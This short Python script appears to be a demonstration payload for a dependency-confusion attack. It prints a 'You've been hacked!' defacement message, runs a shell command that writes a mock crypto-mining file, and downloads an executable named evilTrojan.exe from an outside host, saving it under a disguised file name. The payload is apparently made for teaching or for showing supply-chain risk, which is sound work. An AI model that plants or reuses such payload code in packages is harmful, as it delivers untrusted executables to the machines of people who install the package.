import os
import requests

# defacing
print("You've been hacked!")

# command execution
os.system("echo 'Time to start crypto-mining' > ~/Demo/dependencyConfusion/cryptoMiner.txt")

# arbitrary file download
url = 'https://s0merset7.github.io/evilTrojan.exe'
response = requests.get(url)
file_Path = os.path.expanduser('~/Demo/dependencyConfusion/totallyNotEvilFile.exe')

with open(file_Path, 'wb') as file:
    file.write(response.content)
print("Arbitrary file download complete")
